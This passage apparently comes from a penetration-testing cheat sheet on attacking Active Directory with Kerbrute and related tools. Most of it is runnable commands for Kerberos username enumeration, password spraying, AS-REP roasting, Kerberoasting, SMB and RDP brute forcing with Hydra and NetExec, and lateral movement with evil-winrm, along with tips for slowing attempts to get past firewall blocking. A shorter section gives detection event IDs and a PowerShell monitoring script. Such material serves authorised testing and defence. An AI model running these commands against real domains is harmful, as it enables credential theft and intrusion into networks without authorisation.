./kerbrute passwordspray -d domain.local valid_users.txt "Password123!" --safe --dc $DC_IP

# Step 3: Check for AS-REP roastable accounts
./kerbrute userenum -d domain.local valid_users.txt --dc $DC_IP --hash-file asrep.hash

# Step 4: Target specific service accounts
./kerbrute passwordspray -d domain.local service_accounts.txt "Password1" --dc $DC_IP
```

### Event Log Analysis

#### Windows Event IDs Generated
```bash
# Event ID 4768 - Kerberos TGT Request (Username enumeration)
# Event ID 4771 - Kerberos pre-authentication failed (Password attacks)
# Event ID 4625 - NOT generated (that's why it's stealthier)

# Check logs on Domain Controller
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4768} | Select-Object TimeCreated,Message
```

### Defense and Detection

#### Detection Methods
```bash
# Monitor for rapid 4768 events from single IP
# PowerShell detection script:
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4768 -and $_.TimeCreated -gt (Get-Date).AddMinutes(-5)
} | Group-Object {$_.Properties[6].Value} | Where-Object Count -gt 10
```

#### Mitigation Strategies
- **Account lockout policies** - But affects legitimate users
- **Rate limiting** - Throttle authentication requests
- **Network monitoring** - Detect unusual Kerberos traffic
- **Honey accounts** - Fake accounts to detect enumeration

### Alternative Tools

#### If Kerbrute Doesn't Work
```bash
# Impacket GetNPUsers (AS-REP Roasting)
python3 GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10

# NetExec password spraying
netexec smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Hydra for RDP/SMB
hydra -L users.txt -p Password123! smb://10.10.10.10
hydra -L users.txt -p Password123! rdp://10.10.10.10
```

### Troubleshooting

#### Common Issues and Solutions
```bash
# Issue: "connection refused"
# Solution: Check DC IP and port 88
nmap -p 88 10.10.10.10

# Issue: "clock skew detected"  
# Solution: Sync time with DC
sudo ntpdate -s 10.10.10.10

# Issue: ARM64 binary not available
# Solution: Compile from source (see installation section)

# Issue: Too slow enumeration
# Solution: Increase threads
./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 -t 100

# Issue: Getting blocked by firewall
# Solution: Use delay between attempts
./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 --delay 2000
```

### Integration with Other Tools

#### Complete Attack Chain
```bash
# 1. Username enumeration with Kerbrute
./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 -o valid_users.txt

# 2. AS-REP roasting
python3 GetNPUsers.py domain.local/ -usersfile valid_users.txt -no-pass -dc-ip 10.10.10.10

# 3. Password spraying with NetExec
netexec smb 10.10.10.10 -u valid_users.txt -p common_passwords.txt

# 4. Kerberoasting if credentials found
python3 GetUserSPNs.py domain.local/user:pass -request -dc-ip 10.10.10.10

# 5. Lateral movement
evil-winrm -i 10.10.10.10 -u user -p password
```
